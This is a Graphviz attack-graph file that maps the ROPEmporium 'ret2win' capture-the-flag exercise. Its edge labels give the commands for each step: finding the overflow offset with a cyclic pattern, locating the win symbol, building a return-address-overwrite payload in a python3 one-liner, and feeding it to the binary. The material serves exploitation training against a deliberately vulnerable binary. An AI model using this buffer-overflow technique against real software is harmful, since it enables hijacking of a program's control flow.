digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium ret2win"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="ret2win symbol identified"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Payload crafted"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="ragg2 -P 200 -r > pattern.txt && ./ret2win < pattern.txt"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="nm ret2win | grep ret2win"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; offset=40; ret2win=0xRET2WIN; sys.stdout.buffer.write(b'A'*offset + pack('<Q', ret2win))\" > payload.bin"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="./ret2win < payload.bin"];
}
